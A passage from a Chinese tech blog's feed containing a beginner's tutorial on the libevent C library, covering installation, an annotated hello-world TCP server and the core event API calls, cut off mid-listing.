        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;中断通常被定义为一个事件，该事件改变处理器执行的指令顺序。这样的事件与CPU芯片内外部硬件电路产生的电信号相对应。&lt;/p&gt;
&lt;p&gt;中断通常分
      
    
    </summary>
    
    
      <category term="Linux" scheme="elssm.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>浅学libevent</title>
    <link href="elssm.github.io/2021/11/19/%E6%B5%85%E5%AD%A6libevent/"/>
    <id>elssm.github.io/2021/11/19/浅学libevent/</id>
    <published>2021-11-19T06:17:46.000Z</published>
    <updated>2021-12-13T09:52:46.659Z</updated>
    
    <content type="html"><![CDATA[<h4 id="libevent简介"><a href="#libevent简介" class="headerlink" title="libevent简介"></a>libevent简介</h4><p><code>libevent</code>是一个用C语言编写的轻量级的开源高性能事件通知库，支持多种I/O多路复用技术，支持定时器和信号等事件，而且是跨平台的。</p><h4 id="libevent特点"><a href="#libevent特点" class="headerlink" title="libevent特点"></a>libevent特点</h4><ul><li>事件驱动，高性能</li><li>轻量级，专注于网络</li><li>跨平台，支持<code>Windows</code>、<code>Linux</code>、<code>MacOs</code>等</li><li><p>支持多种I/O多路复用技术，<code>epoll</code>、<code>poll</code>、<code>dev/poll</code>、<code>select</code>和<code>kqueue</code>等</p></li><li><p>支持I/O，定时器和信号等事件</p></li></ul><h4 id="libevent下载及安装"><a href="#libevent下载及安装" class="headerlink" title="libevent下载及安装"></a>libevent下载及安装</h4><p>下载地址：<a href="https://libevent.org/" target="_blank" rel="noopener">https://libevent.org/</a></p><p>这里我下载的是<code>libevent-2.1.8-stable.tar.gz</code>，下载之后解压。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf libevent-2.1.8-stable.tar.gz</span><br></pre></td></tr></table></figure><p>接下来进行源码包安装，这一步的目的是检查安装环境，生成makefile</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br></pre></td></tr></table></figure><p>之后执行<code>make</code>命令生成<code>.o</code>可执行文件，最后执行<code>sudo make install</code>将必要资源放置系统指定目录</p><h4 id="验证libevent安装"><a href="#验证libevent安装" class="headerlink" title="验证libevent安装"></a>验证libevent安装</h4><p>进入<code>libevent-2.1.8-stable</code>下的<code>sample</code>目录，gcc编译<code>hello-world.c</code>文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello-world.c -o hello</span><br></pre></td></tr></table></figure><p>这个时候会出现报错如下，显示未定义引用</p><p><img src="/2021/11/19/浅学libevent/1.png" alt="1"></p><p>出现上述报错是因为我们没有指定库名，因此需要加<code>-l</code>选项</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello-world.c -o hello -l event</span><br></pre></td></tr></table></figure><p><code>hello</code>文件是一个简单的服务器程序，端口是<code>9995</code>，我们尝试运行<code>hello</code>，它会等待客户端的连接。并向客户端发送<code>Hello,World</code>字符串，如下所示，证明<code>libevent</code>库安装成功。</p><p><img src="/2021/11/19/浅学libevent/2.png" alt="2"></p><p><code>libevent</code>库的安装位置在<code>/usr/local/lib</code>路径下</p><p><img src="/2021/11/19/浅学libevent/3.png" alt="3"></p><h4 id="Hello-world分析"><a href="#Hello-world分析" class="headerlink" title="Hello-world分析"></a>Hello-world分析</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This example program provides a trivial server program that listens for TCP</span></span><br><span class="line"><span class="comment">  connections on port 9995.  When they arrive, it writes a short message to</span></span><br><span class="line"><span class="comment">  each client connection, and closes each connection once it is flushed.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Where possible, it exits cleanly in response to a SIGINT (ctrl-c).</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _WIN32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> _XOPEN_SOURCE_EXTENDED</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;event2/bufferevent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;event2/buffer.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;event2/listener.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;event2/util.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;event2/event.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> MESSAGE[] = <span class="string">"Hello, World!\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//指定端口</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> PORT = <span class="number">9995</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明静态函数</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">listener_cb</span><span class="params">(struct evconnlistener *, <span class="keyword">evutil_socket_t</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">    struct sockaddr *, <span class="keyword">int</span> socklen, <span class="keyword">void</span> *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">conn_writecb</span><span class="params">(struct bufferevent *, <span class="keyword">void</span> *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">conn_eventcb</span><span class="params">(struct bufferevent *, short, <span class="keyword">void</span> *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">signal_cb</span><span class="params">(<span class="keyword">evutil_socket_t</span>, short, <span class="keyword">void</span> *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">main(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span>;</span> <span class="comment">//libevent基础声明。相当于一个底座</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">evconnlistener</span> *<span class="title">listener</span>;</span> <span class="comment">//监听，用于建立连接</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">signal_event</span>;</span> <span class="comment">//信号事件</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span> <span class="comment">//地址结构</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN32</span></span><br><span class="line">WSADATA wsa_data;</span><br><span class="line">WSAStartup(<span class="number">0x0201</span>, &amp;wsa_data);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">base = event_base_new(); <span class="comment">//创建底座</span></span><br><span class="line"><span class="keyword">if</span> (!base) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Could not initialize libevent!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;<span class="built_in">sin</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="built_in">sin</span>)); <span class="comment">//地址结构清零</span></span><br><span class="line"><span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line"><span class="built_in">sin</span>.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//相当于socket、bind、listen、accept的融合</span></span><br><span class="line">listener = evconnlistener_new_bind(base, listener_cb, (<span class="keyword">void</span> *)base,</span><br><span class="line">    LEV_OPT_REUSEABLE|LEV_OPT_CLOSE_ON_FREE, <span class="number">-1</span>,</span><br><span class="line">    (struct sockaddr*)&amp;<span class="built_in">sin</span>,</span><br><span class="line">    <span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!listener) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Could not create a listener!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//创建信号事件</span></span><br><span class="line">signal_event = evsignal_new(base, SIGINT, signal_cb, (<span class="keyword">void</span> *)base);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!signal_event || event_add(signal_event, <span class="literal">NULL</span>)&lt;<span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Could not create/add a signal event!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//相当于while循环+select/poll/epoll</span></span><br><span class="line">event_base_dispatch(base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//释放相关事件</span></span><br><span class="line">evconnlistener_free(listener); </span><br><span class="line">event_free(signal_event);</span><br><span class="line">event_base_free(base);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"done\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">listener_cb(struct evconnlistener *listener, <span class="keyword">evutil_socket_t</span> fd,</span><br><span class="line">    struct sockaddr *sa, <span class="keyword">int</span> socklen, <span class="keyword">void</span> *user_data)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = <span class="title">user_data</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bufferevent</span> *<span class="title">bev</span>;</span></span><br><span class="line"></span><br><span class="line">bev = bufferevent_socket_new(base, fd, BEV_OPT_CLOSE_ON_FREE);</span><br><span class="line"><span class="keyword">if</span> (!bev) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error constructing bufferevent!"</span>);</span><br><span class="line">event_base_loopbreak(base);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">bufferevent_setcb(bev, <span class="literal">NULL</span>, conn_writecb, conn_eventcb, <span class="literal">NULL</span>);</span><br><span class="line">bufferevent_enable(bev, EV_WRITE);</span><br><span class="line">bufferevent_disable(bev, EV_READ);</span><br><span class="line"></span><br><span class="line">bufferevent_write(bev, MESSAGE, <span class="built_in">strlen</span>(MESSAGE));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">conn_writecb(struct bufferevent *bev, <span class="keyword">void</span> *user_data)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">evbuffer</span> *<span class="title">output</span> = <span class="title">bufferevent_get_output</span>(<span class="title">bev</span>);</span></span><br><span class="line"><span class="keyword">if</span> (evbuffer_get_length(output) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"flushed answer\n"</span>);</span><br><span class="line">bufferevent_free(bev);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">conn_eventcb(struct bufferevent *bev, short events, <span class="keyword">void</span> *user_data)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (events &amp; BEV_EVENT_EOF) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Connection closed.\n"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (events &amp; BEV_EVENT_ERROR) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Got an error on the connection: %s\n"</span>,</span><br><span class="line">    strerror(errno));<span class="comment">/*XXX win32*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* None of the other events can happen here, since we haven't enabled</span></span><br><span class="line"><span class="comment"> * timeouts */</span></span><br><span class="line">bufferevent_free(bev);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">signal_cb(<span class="keyword">evutil_socket_t</span> sig, short events, <span class="keyword">void</span> *user_data)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = <span class="title">user_data</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">delay</span> = &#123;</span> <span class="number">2</span>, <span class="number">0</span> &#125;; <span class="comment">//延迟两秒</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Caught an interrupt signal; exiting cleanly in two seconds.\n"</span>);</span><br><span class="line"></span><br><span class="line">event_base_loopexit(base, &amp;delay);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="libevent框架"><a href="#libevent框架" class="headerlink" title="libevent框架"></a>libevent框架</h4><h5 id="创建event-base"><a href="#创建event-base" class="headerlink" title="创建event_base"></a>创建event_base</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/event.h&gt;</span></span></span><br><span class="line"><span class="function">struct event_base *<span class="title">event_base_new</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = <span class="title">NULL</span>;</span></span><br><span class="line">base = event_base_new();</span><br></pre></td></tr></table></figure><h5 id="创建事件"><a href="#创建事件" class="headerlink" title="创建事件"></a>创建事件</h5><ul><li>常规事件 <code>event</code>—-&gt;<code>event_new()</code></li><li>带缓冲区的事件 <code>bufferevent</code> —-&gt;<code>bufferevent_socket_new()</code></li></ul><h5 id="添加事件"><a href="#添加事件" class="headerlink" title="添加事件"></a>添加事件</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event_add</span><span class="params">(struct event *ev,<span class="keyword">const</span> struct timeval *tv)</span></span>;</span><br></pre></td></tr></table></figure><h5 id="启动循环"><a href="#启动循环" class="headerlink" title="启动循环"></a>启动循环</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event_base_dispatch</span><span class="params">(struct event_base *base)</span></span>;</span><br><span class="line">base:event_base_new 函数的返回值</span><br><span class="line">  成功：<span class="number">0</span>，失败：<span class="number">-1</span></span><br></pre></td></tr></table></figure><p>只有<code>event_new</code>中指定了<code>EV_PERSIST</code>才持续触发，否则只触发一次，就跳出循环</p><p>通常设置为<code>EV_WRITE|EV_PERSIST</code>、<code>EV_READ|EV_PERSIST</code></p><h5 id="其他循环"><a href="#其他循环" class="headerlink" title="其他循环"></a>其他循环</h5><p>在指定时间后停止循环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event_base_loopexit</span><span class="params">(struct event_base *base,<span class="keyword">const</span> struct timeval *tv)</span></span>;</span><br></pre></td></tr></table></figure><p>立即停止循环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event_base_loopbreak</span><span class="params">(struct event_base *base)</span></span>;</span><br></pre></td></tr></table></figure><h5 id="释放event-base"><a href="#释放event-base" class="headerlink" title="释放event_base"></a>释放event_base</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">event_base_free(base);</span><br></pre></td></tr></table></figure><h4 id="查看支持哪些多路I-O"><a href="#查看支持哪些多路I-O" class="headerlink" title="查看支持哪些多路I/O"></a>查看支持哪些多路I/O</h4><p><code>event.c</code>代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/event.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = <span class="title">event_base_new</span>();</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> **buf;</span><br><span class="line">buf = event_get_supported_methods();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"buf[%d]=%s\n"</span>,i,buf[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gcc编译</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc event.c -o event -l event</span><br></pre></td></tr></table></figure><p>执行结果如下，可以发现mac并不支持<code>epoll</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro event % ./event </span><br><span class="line">buf[<span class="number">0</span>]=poll</span><br><span class="line">buf[<span class="number">1</span>]=select</span><br><span class="line">buf[<span class="number">2</span>]=(null)</span><br><span class="line">buf[<span class="number">3</span>]=(null)</span><br><span class="line">buf[<span class="number">4</span>]=(null)</span><br><span class="line">buf[<span class="number">5</span>]=(null)</span><br><span class="line">buf[<span class="number">6</span>]=(null)</span><br><span class="line">buf[<span class="number">7</span>]=(null)</span><br><span class="line">buf[<span class="number">8</span>]=(null)</span><br><span class="line">buf[<span class="number">9</span>]=(null)</span><br></pre></td></tr></table></figure><h4 id="创建事件-1"><a href="#创建事件-1" class="headerlink" title="创建事件"></a>创建事件</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct event *<span class="title">event_new</span><span class="params">(struct event_base *base,<span class="keyword">evutil_socket_t</span> fd,short what,event_callback_fn cb,<span class="keyword">void</span> *arg)</span></span>;</span><br><span class="line"></span><br><span class="line">base: event_base_new()返回值</span><br><span class="line">  fd: 绑定到event上的文件描述符</span><br><span class="line">  what: 对应的事件(读、写、异常)</span><br><span class="line">    EV_READ 一次读事件</span><br><span class="line">    EV_WRITE 一次写事件</span><br><span class="line">    EV_PERSIST 持续触发，结合event_base_dispatch函数使用</span><br><span class="line">  cb: 一旦事件满足监听条件，回调的函数</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*event_callback_fn)</span><span class="params">(<span class="keyword">evutil_socket_t</span> fd,short,<span class="keyword">void</span> *)</span></span></span><br><span class="line">  arg: 回调的函数的参数</span><br><span class="line">  返回值: 成功创建的event</span><br></pre></td></tr></table></figure><h4 id="添加事件到base"><a href="#添加事件到base" class="headerlink" title="添加事件到base"></a>添加事件到base</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event_add</span><span class="params">(struct event *ev,<span class="keyword">const</span> struct timeval *tv)</span></span>;</span><br><span class="line"></span><br><span class="line">ev: event_new()函数返回的事件</span><br><span class="line">  tv: <span class="literal">NULL</span>,即不会超时 一旦等到事件被触发，回调函数会被调用</span><br></pre></td></tr></table></figure><h4 id="从base拿下事件"><a href="#从base拿下事件" class="headerlink" title="从base拿下事件"></a>从base拿下事件</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event_del</span><span class="params">(struct event *ev)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">  ev: event_new()的返回值</span><br></pre></td></tr></table></figure><h4 id="销毁事件"><a href="#销毁事件" class="headerlink" title="销毁事件"></a>销毁事件</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">event_free</span><span class="params">(struct event *ev)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">  ev: event_new()的返回值</span><br><span class="line">  成功: <span class="number">0</span></span><br><span class="line">  失败: <span class="number">-1</span></span><br></pre></td></tr></table></figure><h4 id="使用libevent读写fifo"><a href="#使用libevent读写fifo" class="headerlink" title="使用libevent读写fifo"></a>使用libevent读写fifo</h4><p><code>read_fifo.c</code>代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span 